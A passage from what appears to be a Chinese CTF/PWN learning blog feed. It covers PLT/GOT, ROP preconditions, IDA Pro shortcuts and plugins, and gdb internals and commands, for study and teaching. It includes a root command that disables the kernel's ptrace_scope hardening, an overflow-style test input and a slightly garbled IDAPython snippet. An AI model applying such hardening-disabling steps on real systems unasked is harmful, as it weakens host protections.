获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"> </span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址：</span><br><span class="line">　　这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure><p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p><p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为<code>全局偏移表（GOT, Global Offset Table）</code>，而那个额外代码段表，称为<code>程序链接表（PLT，Procedure Link Table）</code>。它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏。</p><p>那么PLT和GOT长得什么样子呢？前面已有一些说明，下面以一个例子和简单的示意图来说明PLT/GOT是如何运行的。</p><p>假设最开始的示例代码<code>test.c</code>增加一个write_file函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，test在运行过程中，调用方（如print_banner和write_file)是如何通过PLT和GOT穿针引线之后，最终调用到glibc的printf和write函数的？</p><div style="text-align: center;"><figure><img src="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/417527177.jpg" alt="got&amp;plt关系"><figcaption>got&amp;plt关系</figcaption></figure></div><p>)</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;实现ROP的两个条件:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序存在栈溢出, 并可控制返回地址.&lt;/li&gt;
&lt;li&gt;可以找到所需的gadgets以及它所在的地址.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
      <category term="PWN" scheme="http://www.killshadow.xyz/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>0.1-菜鸟学PWN之工具篇</title>
    <link href="http://www.killshadow.xyz/2019/06/06/0.1-%E8%8F%9C%E9%B8%9F%E5%AD%A6PWN%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
    <id>http://www.killshadow.xyz/2019/06/06/0.1-菜鸟学PWN之工具篇/</id>
    <published>2019-06-06T03:34:00.000Z</published>
    <updated>2019-06-06T07:23:18.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x00-简介">0x00 简介</h2><p>本章介绍在CTF PWN中常用工具的使用及其快捷键，尽量用最短的学习时间快速入门这些工具的使用。随着工具的增多以及其功能的丰富，本章会不定期更新。</p><a id="more"></a><h2 id="x10-ida-pro">0x10 IDA Pro</h2><h3 id="x11-快捷键">0x11 快捷键</h3><p>IDA快捷键如下表：</p><table><thead><tr class="header"><th>快捷键</th><th>功能</th></tr></thead><tbody><tr class="odd"><td>;</td><td>为当前指令添加全文交叉引用的注释</td></tr><tr class="even"><td>/</td><td>在汇编中可见c代码</td></tr><tr class="odd"><td>n</td><td>定义或修改名称，通常用来标注函数名</td></tr><tr class="even"><td>g</td><td>跳转到任意地址</td></tr><tr class="odd"><td>Esc</td><td>返回到跳转前的位置</td></tr><tr class="even"><td>D</td><td>分别按字节、字、双字显示数据</td></tr><tr class="odd"><td>A</td><td>按 ASCII 显示数据</td></tr><tr class="even"><td>u</td><td>取消定义一个函数或变量等</td></tr><tr class="odd"><td>p</td><td>将一段16进制解析成函数(相当于u[undefine]相反的操作)</td></tr><tr class="even"><td>alt + p</td><td>编辑function, 可定义函数的范围(起始/终止地址)</td></tr><tr class="odd"><td>x</td><td>查看交叉引用</td></tr><tr class="even"><td>h</td><td>16/10进制转换</td></tr><tr class="odd"><td>r</td><td>转换成字符串</td></tr><tr class="even"><td>空格键</td><td>反汇编窗口切换文本跟图形</td></tr><tr class="odd"><td>F9</td><td>动态调试程序(其实IDA主要用作静态分析用的)</td></tr><tr class="even"><td>F2</td><td>下断点</td></tr><tr class="odd"><td>N</td><td>重命名</td></tr><tr class="even"><td>Y</td><td>设置变量类型</td></tr><tr class="odd"><td>M</td><td>转换为枚举类型常量</td></tr><tr class="even"><td>ALT+G</td><td>转换局部变量为结构体</td></tr></tbody></table><ol type="1"><li>IDAView下使用小键盘“-”，“+”快捷方式可以在代码同关系图之间切换。</li><li>使用快捷键”*”把变量重定义为数组.</li><li>ALT+T:搜索字符串(文本搜索)</li><li>alt+B:搜索opcode(二进制数据),搜索16进制:</li></ol><h3 id="x12-常用插件">0x12 常用插件</h3><p>插件链接及功能如下:</p><ul><li><a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">IDA FLIRT Signature Database</a> -- 用于识别静态编译的可执行文件中的库函数</li><li><a href="https://github.com/polymorf/findcrypt-yara" target="_blank" rel="noopener">Find Crypt</a> -- 寻找常用加密算法中的常数（需要安装 <a href="https://github.com/VirusTotal/yara-python" target="_blank" rel="noopener">yara-python</a>）</li><li><a href="https://github.com/nihilus/IDA_Signsrch" target="_blank" rel="noopener">IDA signsrch</a> -- 寻找二进制文件所使用的加密、压缩算法</li><li><a href="https://github.com/illera88/Ponce" target="_blank" rel="noopener">Ponce</a> -- 污点分析和符号化执行工具</li><li><a href="https://github.com/yegord/snowman/tree/v0.1.0" target="_blank" rel="noopener">snowman decompiler</a> -- C/C++反汇编插件（F3 进行反汇编）</li><li><a href="https://github.com/REhints/HexRaysCodeXplorer" target="_blank" rel="noopener">CodeXplorer</a> -- 自动类型重建以及对象浏览（C++）（jump to disasm)</li><li><a href="https://github.com/nologic/idaref" target="_blank" rel="noopener">IDA Ref</a> -- 汇编指令注释（支持arm，x86，mips）</li><li><a href="https://github.com/a1ext/auto_re" target="_blank" rel="noopener">auto re</a> -- 函数自动重命名</li><li><a href="https://github.com/tkmru/nao" target="_blank" rel="noopener">nao</a> -- dead code 清除</li><li><a href="https://github.com/igogo-x86/HexRaysPyTools" target="_blank" rel="noopener">HexRaysPyTools</a> -- 类/结构体创建和虚函数表检测</li><li><a href="https://github.com/ynvb/DIE" target="_blank" rel="noopener">DIE</a> -- 动态调试增强工具，保存函数调用上下文信息</li><li><a href="https://github.com/cseagle/sk3wldbg" target="_blank" rel="noopener">sk3wldbg</a> -- IDA 动态调试器，支持多平台</li><li><a href="https://github.com/36hours/idaemu" target="_blank" rel="noopener">idaemu</a> -- 模拟代码执行（支持X86、ARM平台）</li><li><a href="https://github.com/joxeankoret/diaphora" target="_blank" rel="noopener">Diaphora</a> -- 程序差异比较</li><li><a href="https://github.com/keystone-engine/keypatch" target="_blank" rel="noopener">Keypatch</a> -- 基于 Keystone 的 Patch 二进制文件插件</li><li><a href="https://github.com/alexhude/FRIEND" target="_blank" rel="noopener">FRIEND</a> -- 哪里不会点哪里，提升汇编格式的可读性、提供指令、寄存器的文档等</li><li><a href="https://github.com/fireeye/SimplifyGraph" target="_blank" rel="noopener">SimplifyGraph</a> -- 简化复杂的函数流程图</li><li><a href="https://github.com/airbus-seclab/bincat" target="_blank" rel="noopener">bincat</a> -- 静态二进制代码分析工具包，2017 Hex-Rays 插件第一名</li><li><a href="https://github.com/strazzere/golang_loader_assist" target="_blank" rel="noopener">golang_loader_assist</a> -- Golang编译的二进制文件分析助手</li><li><a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a></li></ul><h3 id="x13-常用技巧">0x13 常用技巧</h3><h4 id="堆栈不平衡">① 堆栈不平衡</h4><p>某些函数在使用 f5 进行反编译时，会提示错误 "sp-analysis failed"，导致无法正确反编译。原因可能是在代码执行中的 pop、push 操作不匹配，导致解析的时候 esp 发生错误。</p><p>解决办法步骤如下：</p><ol type="1"><li>用 Option-&gt;General-&gt;Disassembly, 将选项 Stack pointer 打钩</li><li>仔细观察每条 call sub_xxxxxx 前后的堆栈指针是否平衡</li><li>有时还要看被调用的 sub_xxxxxx 内部的堆栈情况，主要是看入栈的参数与 ret xx 是否匹配</li><li>注意观察 jmp 指令前后的堆栈是否有变化</li><li>有时用 Edit-&gt;Functions-&gt;Edit function...,然后点击 OK 刷一下函数定义</li></ol><h4 id="分析选项">② 分析选项</h4><p>选择File菜单下的Open，打开想要逆向的可执行文件，会显示一个Load a new file的界面。这里可以选择: </p><ol type="1"><li>程序的类型； </li><li>处理器的类型； </li><li>加载的段地址和偏移量； </li><li>是否允许分析； </li><li>一些加载选项； </li><li>内核和处理器的一些选项； </li><li>windows系统dll所在的目录。</li></ol><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/20160911173905858.png" alt="Processor type中可选择CPU指令集"><figcaption>Processor type中可选择CPU指令集</figcaption></figure></div><p>​ 上图默认选择PE文件就可以，对于一些网络数据包或者其他格式的文件，可以使用二进制加载，自己进行解析。</p><h4 id="修改数据">③ 修改数据</h4><ul><li>如何修改数据:(在Hex View窗口下) [S1]双击要修改的地方 [S2]使用F2捷方式修改当前字节 [S3]再按下F2快捷方式应用修改。</li><li>如何改变执行流程  [1]修改跳转指令。  [2]修改内存数据。  [3]IDA View中使用下面的命令Jump to IP,Set IP, Run to cursor。 </li><li>保存修改  使用下面的主菜单命令，直接把修改保存到输入文件中,即可。  [IDA Main Menu]-&gt;[Edit]-&gt;[PatchProgram]-&gt;[Apply patches to input file…]</li></ul><h4 id="创建结构体">④ 创建结构体</h4><ol type="1"><li><p>在IDA中打开Structures，快捷键是<code>shift+ F9</code> ,然后按insert键，插入新结构体:</p><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/4332232-fd8690b7cd9cfc90.png" alt="输入结构题的名称"><figcaption>输入结构题的名称</figcaption></figure></div></li><li><p>在<code>ends</code>后按<code>d</code>键，添加相应的成员，然后选中成员名，按<code>N</code>进行修改，选中类型，按<code>d</code>进行更改类型，构造完结构题以后，回到代码窗口</p><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/4332232-eae756a3f89ed9c1.png" alt="修改成员名及其类型"><figcaption>修改成员名及其类型</figcaption></figure></div></li><li><p>在变量堆栈结构里, <code>Edit▶Struct Var（ALT+Q）</code>命令显示一组已知的结构体</p></li><li><p>跳到要定义结构体的变量, 按<code>y</code>, 把它改成<code>(新定义结构体名) *</code>.</p><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/创建及使用结构体.gif" alt="创建及使用结构体"><figcaption>创建及使用结构体</figcaption></figure></div></li></ol><h4 id="解析c头文件">⑤ 解析C头文件</h4><p>解析头文件，可以使用File▶Load File▶Parse C HeaderFile（文件▶加载文件▶解析C头文件）选择你想要解析的头文件。如果一切正常，IDA会通知你Compilation successful（编译完成）。如果解析器遇到任何问题，IDA将会在输出窗口中显示错误消息</p><h4 id="定义数组">⑥ 定义数组</h4><p>当看到这样的多个变量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">102</span>;</span><br><span class="line">v3 = <span class="number">109</span>;</span><br><span class="line">v4 = <span class="number">99</span>;</span><br><span class="line">v5 = <span class="number">100</span>;</span><br><span class="line">v6 = <span class="number">127</span>;</span><br><span class="line">v7 = <span class="number">107</span>;</span><br><span class="line">v8 = <span class="number">55</span>;</span><br><span class="line">v9 = <span class="number">100</span>;</span><br><span class="line">v10 = <span class="number">59</span>;</span><br><span class="line">v11 = <span class="number">86</span>;</span><br><span class="line">v12 = <span class="number">96</span>;</span><br><span class="line">v13 = <span class="number">59</span>;</span><br><span class="line">v14 = <span class="number">110</span>;</span><br><span class="line">v15 = <span class="number">112</span>;</span><br></pre></td></tr></table></figure><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/1543161992885.png" alt="堆栈视图的数组"><figcaption>堆栈视图的数组</figcaption></figure></div><p>可以考虑只定义一个数组, 按<code>*</code>, 会弹出如下窗口:</p><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/1543162127685.png" alt="定义数组"><figcaption>定义数组</figcaption></figure></div><p>要特别注意<code>array size</code>.</p><h4 id="动态调试-远程调试">⑦ 动态调试 &amp; 远程调试</h4><ol type="1"><li><p>如果在win系统上调试<code>exe</code>文件, 则可以直接用本地debugger调试, 按<code>F9</code>之后会跳出如下界面:</p><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/1543162468087.png" alt="本地动态调试"><figcaption>本地动态调试</figcaption></figure></div><p>选<code>Local ...</code>. 即可动态调试. (调试时记得在关键点按<code>F2</code>下断点)</p></li><li><p>如果在win下动态调elf或so文件, 则需要利用到远程调试(一般是本地ida远程连接linux虚拟机来调试)</p><p>Step1: 将IDA安装目录下的linux_server/linux_server64复制到linux虚拟机，在linux下执行linux_server(32/64, 看程序而定)</p><p>Step2: 在Windows下打开需要反汇编的ELF格式文件，并在IDA上配置远程调试的环境：Debugger——Attach——Remote Linux debugger，选<code>Remote Linux debugger</code>:</p><div style="text-align: center;"><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/8343187-5785fafa96954e2f.png" title="fig:" alt="选Remote Linux debugger"></div><p>Step3: 在Debug options勾选如上选项：</p><div style="text-align: center;"><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/8343187-bcc26a65304b68f9.png" title="fig:" alt="在Debug options勾选如上选项"></div><p>Step4: Hostname为虚拟机ip，Password为空</p><div style="text-align: center;"><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/8343187-b07fa424356cb45f.png" title="fig:" alt="Hostname为虚拟机ip，Password为空"></div></li><li><p>如果是so文件, 跟上述方法差不多, 需要额外注意adb shell下的端口转发.</p></li></ol><h3 id="x14-ida-python">0x14 IDA Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">buf = ida_bytes.get_bytes(<span class="number">0x600B00</span>, <span class="number">182</span>)</span><br><span class="line">patch = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> buf:</span><br><span class="line">truepatch += chr(ord(i) ^ <span class="number">0x0C</span>)</span><br><span class="line">ida_bytes.patch_bytes(<span class="number">0x600B00</span>,patch)</span><br></pre></td></tr></table></figure><p>IDA Python API: <a href="https://www.hex-rays.com/products/ida/support/idapython_docs/" target="_blank" rel="noopener">https://www.hex-rays.com/products/ida/support/idapython_docs/</a></p><hr><h2 id="x20-gdb">0x20 GDB</h2><h3 id="x21-gdb-的组成架构">0x21 gdb 的组成架构</h3><div style="text-align: center;"><figure><img src="/2019/06/06/0.1-菜鸟学PWN之工具篇/2.3.1_gdb.png" alt="img"><figcaption>img</figcaption></figure></div><h3 id="x22-gdb-基本工作原理">0x22 gdb 基本工作原理</h3><p>gdb 通过系统调用 <code>ptrace</code> 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。ptrace 系统调用的原型如下： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;</span><br></pre></td></tr></table></figure></p><p>对应的参数如下:</p><ul><li>pid_t pid：指示 ptrace 要跟踪的进程。</li><li>void *addr：指示要监控的内存地址。</li><li>void *data：存放读取出的或者要写入的数据。</li><li>enum __ptrace_request request：决定了系统调用的功能，几个主要的选项：<ul><li><em>PTRACE_TRACEME</em>：表示此进程将被父进程跟踪，任何信号（除了 <code>SIGKILL</code>）都会暂停子进程，接着阻塞于 <code>wait()</code> 等待的父进程被唤醒。子进程内部对 <code>exec()</code> 的调用将发出 <code>SIGTRAP</code> 信号，这可以让父进程在子进程新程序开始运行之前就完全控制它。</li><li><em>PTRACE_ATTACH</em>：attach 到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次 PTRACE_TRACEME 操作。但需要注意的是，虽然当前进程成为被跟踪进程的父进程，但是子进程使用 <code>getppid()</code> 的到的仍将是其原始父进程的 pid。</li><li><em>PTRACE_CONT</em>：继续运行之前停止的子进程。可同时向子进程交付指定的信号。</li></ul></li></ul><h4 id="gdb-的三种调试方式">gdb 的三种调试方式</h4><ol type="1"><li>运行并调试一个新进程<ul><li>运行 gdb，通过命令行或 <code>file</code> 命令指定目标程序。</li><li>输入<code>run</code>命令， gdb 执行下面的操作：<ul><li>通过 <code>fork()</code> 系统调用创建一个新进程</li><li>在新创建的子进程中执行操作：<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code></li><li>在子进程中通过 <code>execv()</code> 系统调用加载用户指定的可执行文件</li></ul></li></ul></li><li>attach 并调试一个已经运行的进程<ul><li>用户确定需要进行调试的进程 PID</li><li>运行 gdb，输入 <code>attach &lt;pid&gt;</code>，gdb 将对指定进程执行操作: <code>ptrace(PTRACE_ATTACH, pid, 0, 0)</code></li></ul></li><li>远程调试目标机上新创建的进程<ul><li>gdb 运行在调试机上，gdbserver 运行在目标机上，两者之间的通信数据格式由 gdb 远程串行协议（Remote Serial Protocol）——定义<a href="https://blog.csdn.net/HMSIWTV/article/details/8759129" target="_blank" rel="noopener">RSP协议数据</a>的基本格式为： <code>$..........#xx</code></li><li>gdbserver 的启动方式相当于运行并调试一个新创建的进程</li></ul></li></ol><p>注意，在你将 gdb attach 到一个进程时，可能会出现这样的问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ attach 9091</span><br><span class="line">Attaching to process 9091</span><br><span class="line">ptrace: Operation not permitted.</span><br></pre></td></tr></table></figure><p>这是因为开启了内核参数 <code>ptrace_scope</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>1 表示 True，此时普通用户进程是不能对其他进程进行 attach 操作的，当然你可以用 root 权限启动 gdb，但最好的办法还是关掉它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</span></span><br></pre></td></tr></table></figure><h4 id="断点的实现">断点的实现</h4><p>断点的功能是通过内核信号实现的，在 x86 架构上，内核向某个地址打入断点，实际上就是往该地址写入断点指令 <code>INT 3</code>，即 <code>0xCC</code>。目标程序运行到这条指令之后会触发 <code>SIGTRAP</code> 信号，gdb 捕获这个信号，并根据目标程序当前停止的位置查询 gdb 维护的断点链表，若发现在该地址确实存在断点，则可判定为断点命中。</p><h3 id="x23-gdb-基本操作">0x23 gdb 基本操作</h3><p>使用 <code>-tui</code> 选项可以将代码显示在一个漂亮的交互式窗口中。</p><h4 id="break----b">break -- b</h4><ul><li><code>break</code> 当不带参数时，在所选栈帧中执行的下一条指令处设置断点。</li><li><code>break &lt;function&gt;</code> 在函数体入口处打断点。</li><li><code>break &lt;line&gt;</code> 在当前源码文件指定行的开始处打断点。</li><li><code>break -N</code> <code>break +N</code> 在当前源码行前面或后面的 <code>N</code> 行开始处打断点，<code>N</code> 为正整数。</li><li><code>break &lt;filename:line&gt;</code> 在源码文件 <code>filename</code> 的 <code>line</code> 行处打断点。</li><li><code>break &lt;filename:function&gt;</code> 在源码文件 <code>filename</code> 的 <code>function</code> 函数入口处打断点。</li><li><code>break &lt;address&gt;</code> 在程序指令的地址处打断点。</li><li><code>break ... if &lt;cond&gt;</code> 设置条件断点，<code>...</code> 代表上述参数之一（或无参数），<code>cond</code> 为条件表达式，仅在 <code>cond</code> 值非零时停住程序。</li></ul><h4 id="info">info</h4><ul><li><code>info breakpoints -- i b</code> 查看断点，观察点和捕获点的列表。<ul><li><code>info breakpoints [list…]</code></li></ul></li><li><code>info break [list…]</code><ul><li><code>list…</code> 用来指定若干个断点的编号（可省略），可以是 <code>2</code>， <code>1-3</code>， <code>2 5</code>等。</li></ul></li><li><code>info display</code> 打印自动显示的表达式列表，每个表达式都带有项目编号，但不显示其值。</li><li><code>info reg</code> 显示当前寄存器信息。</li><li><code>info threads</code> 打印出所有线程的信息，包含 Thread ID、Target ID 和 Frame。</li><li><code>info frame</code> 打印出指定栈帧的详细信息。</li><li><code>info proc</code> 查看 proc 里的进程信息。</li></ul><h4 id="disable----dis">disable -- dis</h4><p>禁用断点，参数使用空格分隔。不带参数时禁用所有断点。</p><ul><li><code>disable [breakpoints] [list…]</code> <code>breakpoints</code> 是 <code>disable</code> 的子命令（可省略），<code>list…</code> 同 <code>info breakpoints</code> 中的描述。</li></ul><h4 id="enable">enable</h4><p>启用断点，参数使用空格分隔。不带参数时启用所有断点。</p><ul><li><code>enable [breakpoints] [list…]</code> 启用指定的断点（或所有定义的断点）。</li><li><code>enable [breakpoints] once list…</code> 临时启用指定的断点。GDB 在停止您的程序后立即禁用这些断点。</li><li><code>enable [breakpoints] delete list…</code> 使指定的断点启用一次，然后删除。一旦您的程序停止，GDB 就会删除这些断点。等效于用 <code>tbreak</code> 设置的断点。</li></ul><p><code>breakpoints</code> 同 <code>disable</code> 中的描述。</p><h4 id="clear">clear</h4><p>在指定行或函数处清除断点。参数可以是行号，函数名称或 <code>*</code> 跟一个地址。</p><ul><li><code>clear</code> 当不带参数时，清除所选栈帧在执行的源码行中的所有断点。</li><li><code>clear &lt;function&gt;</code>, <code>clear &lt;filename:function&gt;</code> 删除在命名函数的入口处设置的任何断点。</li><li><code>clear &lt;line&gt;</code>, <code>clear &lt;filename:line&gt;</code> 删除在指定的文件指定的行号的代码中设置的任何断点。</li><li><code>clear &lt;address&gt;</code> 清除指定程序指令的地址处的断点。</li></ul><h4 id="delete----d">delete -- d</h4><p>删除断点。参数使用空格分隔。不带参数时删除所有断点。</p><ul><li><code>delete [breakpoints] [list…]</code></li></ul><h4 id="tbreak">tbreak</h4><p>设置临时断点。参数形式同 <code>break</code> 一样。当第一次命中时被删除。</p><h4 id="watch">watch</h4><p>为表达式设置观察点。每当一个表达式的值改变时，观察点就会停止执行您的程序。</p><ul><li><code>watch [-l|-location] &lt;expr&gt;</code> 如果给出了 <code>-l</code> 或者 <code>-location</code>，则它会对 <code>expr</code> 求值并观察它所指向的内存。</li></ul><p>另外 <code>rwatch</code> 表示在访问时停止，<code>awatch</code> 表示在访问和改变时都停止。</p><h4 id="step----s">step -- s</h4><p>单步执行程序，直到到达不同的源码行。</p><ul><li><code>step [N]</code> 参数 <code>N</code> 表示执行 N 次（或由于另一个原因直到程序停止）。</li></ul><h4 id="reverse-step">reverse-step</h4><p>反向步进程序，直到到达另一个源码行的开头。</p><ul><li><code>reverse-step [N]</code> 参数 <code>N</code> 表示执行 N 次（或由于另一个原因直到程序停止）。</li></ul><h4 id="next----n">next -- n</h4><p>单步执行程序，执行完子程序调用。</p><ul><li><code>next [N]</code>与 <code>step</code> 不同，如果当前的源代码行调用子程序，则此命令不会进入子程序，而是继续执行，将其视为单个源代码行。</li></ul><h4 id="reverse-next">reverse-next</h4><p>反向步进程序，执行完子程序调用。</p><ul><li><code>reverse-next [N]</code></li></ul><p>如果要执行的源代码行调用子程序，则此命令不会进入子程序，调用被视为一个指令。</p><h4 id="return">return</h4><p>您可以使用 <code>return</code> 命令取消函数调用的执行。如果你给出一个表达式参数，它的值被用作函数的返回值。</p><ul><li><code>return &lt;expression&gt;</code> 将 <code>expression</code> 的值作为函数的返回值并使函数直接返回。</li></ul><h4 id="finish----fin">finish -- fin</h4><p>执行直到选定的栈帧返回。</p><ul><li><code>finish</code></li></ul><h4 id="until----u">until -- u</h4><p>执行程序直到大于当前栈帧或当前栈帧中的指定位置（与 <code>break</code> 命令相同的参数）的源码行。此命令常用于通过一个循环，以避免单步执行。</p><ul><li><code>until &lt;location&gt;</code> 继续运行程序，直到达到指定的位置，或者当前栈帧返回。</li></ul><h4 id="continue----c">continue -- c</h4><p>在信号或断点之后，继续运行被调试的程序。</p><ul><li><code>continue [N]</code></li></ul><p>如果从断点开始，可以使用数字 <code>N</code> 作为参数，这意味着将该断点的忽略计数设置为 <code>N - 1</code>(以便断点在第 N 次到达之前不会中断)。</p><h4 id="print----p">print -- p</h4><p>求表达式 expr 的值并打印。可访问的变量是所选栈帧的词法环境，以及范围为全局或整个文件的所有变量。</p><ul><li><code>print [expr]</code></li><li><code>print /f [expr]</code> 通过指定 <code>/f</code> 来选择不同的打印格式，其中 <code>f</code> 是一个指定格式的字母</li></ul><h4 id="x">x</h4><p>检查内存。</p><ul><li><code>x/nfu &lt;addr&gt;</code></li><li><code>x &lt;addr&gt;</code><ul><li><code>n</code>, <code>f</code>, 和 <code>u</code> 都是可选参数，用于指定要显示的内存以及如何格式化。</li><li><code>addr</code> 是要开始显示内存的地址的表达式。</li><li><code>n</code> 重复次数（默认值是 1），指定要显示多少个单位（由 <code>u</code> 指定）的内存值。</li><li><code>f</code> 显示格式（初始默认值是 <code>x</code>），显示格式是 <code>print('x'，'d'，'u'，'o'，'t'，'a'，'c'，'f'，'s')</code> 使用的格式之一，再加 <code>i</code>（机器指令）。</li><li><code>u</code> 单位大小，<code>b</code> 表示单字节，<code>h</code> 表示双字节，<code>w</code> 表示四字节，<code>g</code> 表示八字节。</li></ul></li></ul><h4 id="display">display</h4><p>每次程序停止时打印表达式 expr 的值。</p><ul><li><code>display &lt;expr&gt;</code></li><li><code>display/fmt &lt;expr&gt;</code></li><li><code>display/fmt &lt;addr&gt;</code></li></ul><p><code>fmt</code> 用于指定显示格式。对于格式 <code>i</code> 或 <code>s</code>，或者包括单位大小或单位数量，将表达式 <code>addr</code> 添加为每次程序停止时要检查的内存地址。</p><h4 id="disassemble----disas">disassemble -- disas</h4><p>反汇编命令。</p><ul><li><code>disas &lt;func&gt;</code> 反汇编指定函数</li><li><code>disas &lt;addr&gt;</code> 反汇编某地址所在函数</li><li><code>disas &lt;begin_addr&gt; &lt;end_addr&gt;</code> 反汇编从开始地址到结束地址的部分</li></ul><h4 id="undisplay">undisplay</h4><p>取消某些表达式在程序停止时自动显示。参数是表达式的编号（使用 <code>info display</code>查询编号）。不带参数表示取消所有自动显示表达式。</p><h4 id="disable-display">disable display</h4><p>禁用某些表达式在程序停止时自动显示。禁用的显示项目被再次启用。参数是表达式的编号（使用 <code>info display</code> 查询编号）。不带参数表示禁用所有自动显示表达式。</p><h4 id="enable-display">enable display</h4><p>启用某些表达式在程序停止时自动显示。参数是重新显示的表达式的编号（使用 <code>info display</code> 查询编号）。不带参数表示启用所有自动显示表达式。</p><h4 id="help----h">help -- h</h4><p>打印命令列表。</p><ul><li><code>help &lt;class&gt;</code> 您可以获取该类中各个命令的列表。</li><li><code>help &lt;command&gt;</code> 显示如何使用该命令的简述。</li></ul><h4 id="attach">attach</h4><p>挂接到 GDB 之外的进程或文件。将进程 ID 或设备文件作为参数。</p><ul><li><code>attach &lt;process-id&gt;</code></li></ul><h4 id="run----r">run -- r</h4><p>启动被调试的程序。可以直接指定参数，也可以用 <code>set args</code> 设置（启动所需的）参数。还允许使用 <code>&gt;</code>, <code>&lt;</code>, 或 <code>&gt;&gt;</code> 进行输入和输出重定向。</p><p>甚至可以运行一个脚本，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run `python2 -c &apos;print &quot;A&quot;*100&apos;`</span><br></pre></td></tr></table></figure><h4 id="backtrace----bt">backtrace -- bt</h4><p>打印整个栈的回溯。</p><ul><li><code>bt</code> 打印整个栈的回溯，每个栈帧一行。</li><li><code>bt n</code> 类似于上，但只打印最内层的 n 个栈帧。</li><li><code>bt -n</code> 类似于上，但只打印最外层的 n 个栈帧。</li><li><code>bt full n</code> 类似于 <code>bt n</code>，还打印局部变量的值。</li></ul><blockquote><p>注意：使用 gdb 调试时，会自动关闭 ASLR，所以可能每次看到的栈地址都不变。</p></blockquote><h4 id="ptype">ptype</h4><p>打印类型 TYPE 的定义。</p><ul><li><code>ptype[/FLAGS] TYPE-NAME | EXPRESSION</code></li></ul><p>参数可以是由 <code>typedef</code> 定义的类型名， 或者 <code>struct STRUCT-TAG</code> 或者 <code>class CLASS-NAME</code> 或者 <code>union UNION-TAG</code> 或者 <code>enum ENUM-TAG</code>。</p><h4 id="set-follow-fork-mode">set follow-fork-mode</h4><p>当程序 fork 出一个子进程的时候，gdb 默认会追踪父进程（<code>set follow-fork-mode parent</code>），但也可以使用命令 <code>set follow-fork-mode child</code> 让其追踪子进程。</p><p>另外，如果想要同时追踪父进程和子进程，可以使用命令 <code>set detach-on-fork off</code>（默认为<code>on</code>），这样就可以同时调试父子进程，在调试其中一个进程时，另一个进程被挂起。如果想让父子进程同时运行，可以使用 <code>set schedule-multiple on</code>（默认为<code>off</code>）。</p><p>但如果程序是使用 exec 来启动了一个新的程序，可以使用 <code>set follow-exec-mode new</code>（默认为<code>same</code>） 来新建一个 inferior 给新程序，而父进程的 inferior 